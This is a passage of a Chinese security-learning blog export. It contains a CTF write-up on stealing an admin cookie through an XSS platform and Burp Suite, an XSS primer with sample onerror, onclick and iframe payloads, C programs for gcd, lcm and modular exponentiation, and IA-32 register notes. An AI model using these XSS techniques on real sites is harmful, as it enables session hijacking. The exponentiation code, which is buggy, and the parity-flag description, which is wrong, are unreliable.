Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。 注：上述信息来源 wikipedia ③ 什么是Cookie 劫持？​ 所谓 Cookie 劫持就是攻击者通过非法的手段获取用户浏览器的 Cookie，攻击者用获取到的 Cookie 伪装成被攻击者的身份，与服务器进行信息传递。 3. 相关工具 Burp Suite：Burp Suite 是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。 XSS 平台：提供 XSS 攻击的平台。 proof 4. 其他内容 代理服务的设置 Burp Suite 证书的导出以及浏览器证书的导入问题 substr() 函数（字符截取函数）格式： 格式 1：substr(string string,int a,int b); string：是需要截取的字符串； a：截取字符串的开始位置（注：当a等于0或1时，都是从第一位开始截取）； b：要截取的字符串的长度 格式2：substr(string string, int a) ; string：是需要截取的字符串； a：可以理解为从第a个字符开始截取后面所有的字符串。 python md5 加密方式 二、前期准备1. 分析题目 ​ 通过上面的题目的提示，我们一点一点的来分析题目的要求： 首先我们所要求的 flag 在 admin.PHP 文件中，只有管理员才能得到它； 那么最直接得方法就是，我们可以发送一条消息给管理员请求他们把 flag 给我们，但是管理员是不会鸟我的； leava a message 这一个表格中应该是我们要发送的数据； substr(md5(‘***********‘),0.6) === ‘e6a5c3’ 这里面的表格应该是让我们填写的内容经过一系列运算，最后的结果应该与 ‘ ’ 中的字符串同类型同值； ​ 经过上述分析后，我们可以大概的清楚这道题目的解题思路： 我们首先要得到 md5(‘****‘) 中 * 的内容，这一步估计需要自己写脚本，进行运算； 我们将 message 和正确的 string 发送给服务器，服务器应该会给我们作出反应，并且在浏览器产生 Cookie，而这个 Cookie 代表浏览器的身份； 再去点击 admin.PHP 就会得到我们想要的 Flag； 2. 提出问题 ​ 我们经过前面的分析，可能会产生如下的疑问： ​ （1）我们怎么才能得到一个 str1，在经过 MD5 加密后，并将加密后得到的字符串，经 substr() 函数截取前 6 个字符得到的 ‘ === ’ 后面跟着的字符串？ ​ （2）在计算出正确的 str1 后，我们应该怎么得到 token 令牌呢？ 3. 查阅资料 ​ 为了解决上述的问题，对此我上网查阅了相关的文章和资料，提出下方的解决办法： ​ （1）针对第一个问题，我们可以利用 python 的库对此进行求解； ​ （2）针对第二个问题，我们可以利用 XSS 平台来获得 Cookie 的 token 令牌； 三、解题步骤1. 求加密前的字符串 ​ 相关代码如下： 123456789101112import hashlib # This module implements a common interface to many different secure hash and message digest algorithms. Included are the FIPS secure hash algorithms SHA1, SHA224, SHA256, SHA384, and SHA512 (defined in FIPS 180-2) as well as RSA’s MD5 algorithm from itertools import count # def md5(Md5_str): return hashlib.md5(Md5_str.encode(encoding='utf8')).hexdigest()for i in count(0): # 这是一个计数器，是 itertools 下的一个功能 Str = md5(str(i)) if Str.startswith('Name of string'): print(i) break ​ 关于上的脚本程序，我会后续进行总结和更新，现在就简单的叙述一下，在这个脚本中主要涉及了以下几个知识点： ​ （1）md5 用 python 加密需要导入 hashlib 库 ​ （2）要实现一个无限循环，需要用 itertools 中的 count，有关这个用法我会在下期博客进行详细的讲解 ​ （3）要明白 python 中对象的用法 2. 利用 XSS 平台获取 Cookie（admin） ​ 如果上一步提交的字符串正确的话，那么我们就可以与服务器成功建立连接，但是这是一种非持久连接，如果我们用这时的 Cookie 再点击 admin.PHP 的话，我们就可以获取 Flag。 我们将 XSS 平台的代码放到 message 中，再将得到的数值放入 MD5 中，进行提交，在 XSS 平台上 我们可以获得如下的界面： ​ 这个时候我们截取到了浏览器与服务器交互的 Cookie 中的 token 令牌 3. 设置 Burp Suite ​ 在替换 Cookie 之前，我们需要用 Burp Suite 软件（需要配置 Java 环境）截断浏览器发给服务器的 Cookie，首先需要设置代理，如下图：左图为 Burp Suite 的代理，右图为浏览器（Microsoft Edge）的代理设置。两者的代理设置要一致。 4. 替换 Cookie ​ 当我们只是“单纯”的点击 admin.PHP 链接后，服务器会给我们一个这样的页面： ​ 该页面说明我们不是以管理员的身份访问服务器的，所以自然也不能得到 flag。那么我们该怎么以管理员的身份访问服务器呢？前面我们提交了一个 MD5 加密前的一个字符串，以及一个 XSS 代码，服务器给我们返回的页面如下： ​ 红色标注意思为：您的邮件已在管理员列表的队列中，说明前面我们前面得到的 Cookie 已经被放入管理员列表中了，我们可以通过 XSS 平台获取的 Cookie 进入 admin.PHP （也就是以管理员的身份进入 admin.PHP）得到 flag。 ​ 我们点击 admin.PHP 后，Burp Suite 会为我们截获一个浏览器发送给服务器的请求，在这个请求会存在一个 Cookie，这个Cookie 的数据就是我们将要替换的目标，如下图所示： ​ 在将 Cookie 进行替换后，下一步只需要点击 “Forward” 按钮，将网页数据发送给服务器。 ​ 这个时候服务器会识别 GET 中的 Cookie，发现该 Cookie 在管理员的列表中，服务器于是认为发送该请求的主体是 admin，于是服务器会把 flag 返回给浏览器，如下图： 四、遗留问题 ​ 虽然这道题目做出来了，但是仍然有很多问题等着我去解决，现在将这些问题一一列举出来，以方便以后的学习： Cookie 的完整机制和知识 XSS 的完整知识体系结构 HTML 的运行原理 python MD5 的加密和解密程序分析 Burp Suite 的其他功能]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS 基础知识（一）]]></title>
    <url>%2F2019%2F07%2F26%2F2019.07.26%EF%BC%8875%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、基础知识**① 什么是 XSS？** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XSS ，跨站脚本攻击，英文全称为：Cross Site Script，但是为了与层叠样式表的缩写（CSS）相区分，所以在安全领域叫做 “XSS”。 ​ XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括 Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。 **② JavaScript 详细内容** ​ 将会在后期的学习中陆续更新。 二、XSS 攻击**① XSS 攻击的原理是什么？** ​ HTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是HTML标签的开始， 与 之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。 **② XSS 攻击的类型** 持久型跨站：最直接的危害类型，跨站代码存储在服务器（数据库） 非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码 DOM跨站（DOM XSS）:DOM（document object model 文档对象模型），客户端脚本处理逻辑导致的安全问题 **③ XSS 常见的攻击手段和目的** 盗用cookie，获取敏感信息。 **破坏正常的页面结构,插入一些恶意内容** 利用植入Flash，通过crossdomain权限设置进一步获取更高权限（不常用了）；或者利用Java等得到类似的操作; 利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作; 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动; 在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS击的效果。 **④ 代码案例** 123456植入代码自动触发 /?xss=&lt;img src="null" onerror="alert(1)" /&gt; 植入代码引诱触发 /?xss=&lt;p onclick="alert('点我')" /&gt;点我&lt;/p&gt; 植入代码嵌入页面 /?xss=&lt;iframe src="//www.baidu.com/t.html"&gt;&lt;/iframe&gt; 三、相关知识点 ​ 在 XSS 攻击中涉及到许多得知识点，我仍然有很多不会的甚至不了解的，再次列举一下相关的知识点，为以后的学习指明方向。 JavaScript HTTP 原理 HTML 语言]]></content>
      <tags>
        <tag>web</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[乘法链算法的实现]]></title>
    <url>%2F2019%2F07%2F20%2F2019.07.20%EF%BC%8874%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“乘法链算”实现的过程吧。 一、基础知识 1.模运算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 概念：模运算，即为求余数的运算&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 运算符：模运算的运算符记为 mod&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如：a mod b = n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;表示的意思是a 除以 b 所得的余数为 r，而上式中的 N 通常称为模数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例子：17 mod 11 = 6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8 mod 7 = 12.同余的相关内容&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 概念：若 a mod n = b mod n = r，记为 a ≡ b (mod n)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 例如：13 mod 7 = 20 mod 7 = 6 ，则&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 13 ≡ 20 (mod 7)&lt;/font&gt; 3.模运算的性质 加法运算：(a + b) mod n = (a mod n + b mod n) mod n; 减法运算：(a - b) mod n = (a mod n - b mod n) mod n; 乘法运算：(a × b) mod n = ((a mod n) × (b mod n)) mod n 分配律：((a + b) mod p × c) mod n = ((a × c) mod p + (b × c) mod p) mod n = (((a × c) mod p) mod n + ((b × c) mod p) mod n) 结合律：((a + b) mod n + c) mod n = (a + (b + c) mod n) mod n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ((a b) mod n c) mod n = (a (b c) mod n) mod n 交换律：(a + b) mod n = (b + a) mod n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;(a b) mod n = (b a) mod n 二、乘法链算法 1.什么是乘法链算法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 如何计算 am mod n？：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不要直接计算（a × a × a × … × a）mod n，这样会导致因中间结果巨大而计算溢出；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 解决的思路：利用模运算的性质简化中间结果，但即使这样，仍然有技巧，如果直接计算 a × （a × … × （a mod n) mod n）mod n，需要计算 m 次模运算，仍然不够优化。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 正确的思路：将 m 看成 2 的幂次方之和，再利用模运算的性质。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;④ 例子：计算 a25 mod n（m = 25 是 11001）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; a25 = 11001 mod n = (a16 a8 a1) mod n ——&gt; 乘法链算法 三、最小公倍数的加法算法代码实现123456789101112131415161718192021222324252627282930313233343536373839404142/*Date: 2019.7.15Function：实现乘法链算法*/#include&lt;stdio.h&gt;#include&lt;math.h&gt;int main()&#123; int a,n,u,s = 1,index,result; long int t; int b[1000]; printf("Please enter the base of the dividend:"); scanf("%d",&amp;a); printf("Please enter the index of the dividend:"); scanf("%d",&amp;u); printf("Please enter a divisor:"); scanf("%d",&amp;n); index = u; /*将被除数幂形式的指数展开为二进制形式*/ for(int i = 0;u != 0;i++) &#123; if(u % 2 == 1) b[i] = 1; else b[i] = 0; u = u &gt;&gt; 1; &#125; /*乘法链算法实现代码*/ t = a; // 对 a 进行初始化； for(int m = 0;m &lt; i;m++) &#123; if(b[m]) // 当二进制的所在位的值为 1 时进行运算 s = t % n * s; // 求的是将幂次展开后，每个幂次 mod n 的结果之积:（s1 mod n）*（s2 mod n）*……*（si mod n） result = s % n; // 将所求的结果再与 n 进行模运算：（（s1 mod n）*（s2 mod n）*……*（si mod n））mod n t = pow(t,2); // 每进行一次循环，t 的值就要翻倍 &#125; printf("%d^%d mod %d = %d\n",a,index,n,result); &#125; 说明：上面的代码实现是我按照自己的思路写出来的，可能在逻辑上会出现一些错误，还希望各位大神批评，或者有更好的算法，也希望各位大神能够在评论区附上你们的算法代码，感激不尽。]]></content>
      <tags>
        <tag>密码算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最小公倍数的加法算法实现]]></title>
    <url>%2F2019%2F07%2F18%2F2019.07.18%EF%BC%8873%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“最小公倍数的加法算法”实现的过程吧。 一、基础知识 1.公倍数的概念&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果 a₁| b,……，an | b，则称 b 是 a1，……，an 的公倍数。而最小公倍数就是所有公倍数里最小的。2.最小公倍数的表示形式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最小公倍数的表示形式为 **lcm (a,b) = a 和 b 的最小公倍数**&lt;/font&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如：lcm (18,24) = 72 二、求最小公倍数 1.lcm (a,b) = ab / gcd (a,b)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 推导过程如下：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设a，b的最大公约数为 d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;则a，b的最小公倍数为d a/d b/d = ab / d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以a，b的最小公倍数 最大公约数 = ab /d d = ab&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以ab = lcm（a，b） gcd（a，b）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*② 存在的问题：用此方法来求最小公倍数，会计算大量乘法和除法，效率仍然不够高。 2.加法计算最小公倍数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 方法：两者取最小，反复加自己，相等时停止。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 例子：lcm (6,15) = 30&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;06&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;15&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;12&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;30&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;18&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;24&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;30 三、最小公倍数的加法算法代码实现123456789101112131415161718192021222324/*Date: 2019.7.15Function：实现寻找最小公倍数*/#include&lt;stdio.h&gt;int main()&#123; int a1,a2,a,b,lcm; printf(&quot;Please input two numbers:&quot;); scanf(&quot;%d%d&quot;,&amp;a1,&amp;a2); a = a1; b = a2; while(a!=b) &#123; if(a &lt; b) a = a + a1; else b = b + a2; &#125; lcm = a; printf(&quot;lcm(%d,%d) = %d\n&quot;,a1,a2,lcm);&#125; 说明：上面的代码实现是我按照自己的思路写出来的，可能在逻辑上会出现一些错误，还希望各位大神批评，或者有更好的算法，也希望各位大神能够在评论区附上你们的算法代码，感激不尽。]]></content>
      <tags>
        <tag>密码算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[欧几里得算法的实现]]></title>
    <url>%2F2019%2F07%2F15%2F2019.07.15%EF%BC%8872%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 今天主要写了三个算法：欧几里得算法、最小公倍数的加法算法以及乘法链算法，在看过林老师的视频后，自己理清了思路之后，并且经过缜密的思考后，最终将这三个算法成功写出。今天就先来总结一下“欧几里得算法”的过程吧。 一、基础知识 1.最大公约数的概念&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;公约数中最大的那个称为a1，a2，……，an的最大公约数，记为：gcd(a1，a2，……，an)。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gcd(11,77) = 112.互素&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;若 gcd(a1，a2，……，an) = 1，也就是说 a1，a2，……，an 的最大公约数为 1，那么称 a1，a2，……，an 是互素的。3.最大公约数的性质&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❁ 在互素的正整数中，不一定有素数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如：gcd(25,42) = 1，但是 25 和 42 都不是素数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;❁ 在个数不少于 3 个的互素正整数中，不一定两两互素&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如：gcd(6,10,45) = 1，但是：&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;gcd(6,10) = 2；gcd(6,45) = 3；gcd(10,45) = 5； 二、欧几里得算法 1.欧几里得算法（辗转相除法）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;辗转相除法， 又名欧几里德算法（Euclidean algorithm），是求最大公约数的一种方法。它的具体做法是：用较大数除以较小数，再用出现的余数（第一余数）去除除数，再用出现的余数（第二余数）去除第一余数，如此反复，直到最后余数是0为止。如果是求两个数的最大公约数，那么最后的除数就是这两个数的最大公约数。2.欧几里得算法的原理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;若 a = b * d + r，则 gcd(a,b) = gcd(b,r)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注释：a：被除数；b：除数；d：商；r：余数；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;【例子】：已知 a = 63，b = 24，利用欧几里得算法求得两个数的最大公约数。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;【解】&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;63 ÷ 24 = 2 ······ 15&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;24 ÷ 15 = 1 ······ 9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;15 ÷ 9 = 1 ······ 6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;9 ÷ 6 = 1 ······ 3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6 ÷ 3 = 2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;∴ gcd(63,24) = gcd(6,3) = 33.欧几里得算法的推导&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设两数为a、b(a&gt;b)，用 gcd(a,b) 表示a，b的最大公约数，r = a (mod b) 为 a 除以 b 的余数，k 为 a 除以 b 的商，即 a÷ b = k ······ r 。辗转相除法即是要证明 gcd(a,b) = gcd(b,r) 。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第一步：令 c = gcd(a,b) ，则设 a = mc，b = nc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二步：根据前提可知 r = a - kb = mc - knc = (m - kn) * c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步：根据第二步结果可知， c 也是 r 的因数&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第四步：可以断定 m -kn 与 n 互质（这里用反证法进行证明：设 m -kn = xd，n = yd (d &gt; 1) ，则 m = kn +xd = kyd + xd = (ky + x) * d ，则 a = mc =(ky + x) * cd，b = nc = ycd，则 a 与 b 的一个公约数 cd &gt; c ，故c非a与b的最大公约数，与前面结论矛盾，因此c也是b与r的最大公约数）从而可知 gcd(b,r) = c ，继而 gcd(a,b) = gcd(b,r) 。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;证毕&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注：以上步骤的操作是建立在刚开始时 r ≠ 0 的基础之上的，即 m 与 n 亦互质。3.欧几里得算法的实现（C语言实现）12345678910111213141516171819202122232425262728293031323334/*Date: 2019.7.15Function：欧几里得算法的实现*/#include&lt;stdio.h&gt;int main()&#123; int a1,a2,temp,gcd,n; printf(&quot;Please input two number:&quot;); scanf(&quot;%d%d&quot;,&amp;a1,&amp;a2); printf(&quot;gcd(%d,%d) = &quot;,a1,a2); /*对所求的两个数进行排序，从大到小*/ if(a1 &lt;= a2) &#123; temp = a2; a2 = a1; a1 = temp; &#125; /*欧几里得算法的实现*/ n = a1 % a2; // 求大数对小数的取余 while(n) // 如果求得的余数不等于0，则按照辗转相除的方法进行计算，知道得到的余数等于0 &#123; a1 = a2; a2 = n; n = a1 % a2; if(!n) gcd = a2; &#125; gcd = a2; // 如果求得的余数等于0，说明a1能被a2整除，也就是说a2是a1的一个公约数，那么a1和a2的最大公约数就是a2 printf(&quot;gcd(%d,%d) = %d\n&quot;,a1,a2,gcd);&#125; 说明：上面的代码实现是我按照自己的思路写出来的，可能在逻辑上会出现一些错误，还希望各位大神批评，或者有更好的算法，也希望各位大神能够在评论区附上你们的算法代码，感激不尽。]]></content>
      <tags>
        <tag>密码算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《软件安全分析与应用》第 2 章：基础知识学习笔记(1)]]></title>
    <url>%2F2019%2F07%2F13%2F2019.07.13%EF%BC%8871%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、CPU 的结构包括寄存器、算术逻辑单元（ALU）、控制器和内部总线 寄存器：提供CPU的内部存储，用来暂时存方参与运算的数据及运算结果，不同的寄存器代表了不同的物理含义，应用到不同的功能场景 算术逻辑单元：执行计算机的运算功能，包括：+、-、*、÷，左右移位运算，与、或、非、异或逻辑运算 控制器：控制计算机各部件工作，包括取指、译码、执行 内部总线：将寄存器、ALU 以及控制器进行互连，提供通信机制 2、冯·诺伊曼CPU的运作原理可分为四个阶段：提取、解码、执行和写回 提取：从程序内存中检索指令，指令的提取往往必须从相对较慢的存储器查找 解码：CPU 将提取到的指令被拆解为有意义的片段； 执行：连接到各种能够进行所需运算的 CPU 部件：例如，要求一个加法运算，算术逻辑单元将会连接到一组输入和一组输出。输入提供了要相加的数值，而且在输出将含有总和结果。ALU内含电路系统，以于输出端完成简单的普通运算和逻辑运算（比如加法和位操作）。如果加法运算产生一个对该CPU处理而言过大的结果，在标志寄存器里，溢出标志可能会被设置； 写回：以一定格式将执行阶段的结果简单的写回 许多复杂的CPU可以一次提取多个指令、解码，并且同时执行。这个部分一般涉及“经典RISC管线”，那些实际上是在众多使用简单CPU的电子设备中快速普及（常称为微控制器） 3、IA-32 的 CPU 寄存器 IA-32 的 CPU 寄存器包括指令指针寄存器、通用数据寄存器、地址指针寄存器、变址指针寄存器、标志位寄存器、段寄存器、控制寄存器等 指令指针寄存器：EIP，存储了当前执行指令的地址，系统根据该寄存器进行寻址，从内存中取出指令，然后再译码、执行； 通用数据寄存器：EAX、ECX、EDX、EBX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;○ EAX、EDX，常作为乘除法指令的隐含操作数；16位的通用数据寄存器为AX、CX、DX、BX；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;○ ECX，常被用于存储循环处理指令的循环次数；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;○ EBX 地址指针寄存器：ESP、EBP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;○ ESP：记录了当前的栈顶，call、ret、push、pop、pusha、popa等指令会改变ESP寄存器的值；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;○ EBP：通常记录的是当前函数的栈底 变址指针寄存器：ESI、EDI，这两个操作数常作为隐含操作数，指令执行完成后自动递增实现变址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;○ ESI：操作数源地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;○ EDI：操作数目的地址 标志位寄存器：统称为 EFLAGS：CF、PF、AF、ZF、SF、TF、IF、DF、OF、IOPL、NT、RF、VM、AC、VIF、VIP、ID标志位寄存器是仅仅用来操纵bit的寄存器，任何指令都会根据计算的结果影响到标志位寄存器。比如说，经过一个减法操作，如果结果是0，那么zero flag就会被设置，如果不是0，其值会被清掉&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ CF：进位标志，如果无符号运算产生进位或借位则值为1，否则值为0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ PF：奇偶标志，用于表示运算结果中1的个数的奇偶性，偶数个 1 时值为 1，奇数个 1 时值为 1；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ AF：辅助进位标志，在字节操作时标记低字节（低 4 位）是否向高字节（高 4 位）进位或借位；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ ZF：零标志，运算结果为 0 时其值置 1 ，否则置 0；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ SF：符号标志，有符号数运算结果小于 0 时置 1，否则置 0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ IF：中断允许标志，，决定 CPU 是否响应 CPU 外部的可屏蔽中断发出的中断请求，置 1 时可以响应中断，置 0 时不响应中断&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ DF：方向标志&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ OF：溢出标志，有符号运算发生溢出时置 1，否则置 0；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ IOPL：用于表示当前进程的 I/O 特权级别，只有当前进程的 CPL 小于或等于 IOPL 时才能访问 I/O 地址空间&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ NT：嵌套任务标志，置 1 表明当前任务是在另一个任务中嵌套执行，置 0 表明非嵌套&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ RF：恢复标志，置 1 禁用指令断点，置 0 允许指令断点&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ VM：虚拟 8086 模式标志，置 1 运行在虚拟 8086 模式，置 0 运行在保护模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;⚑ 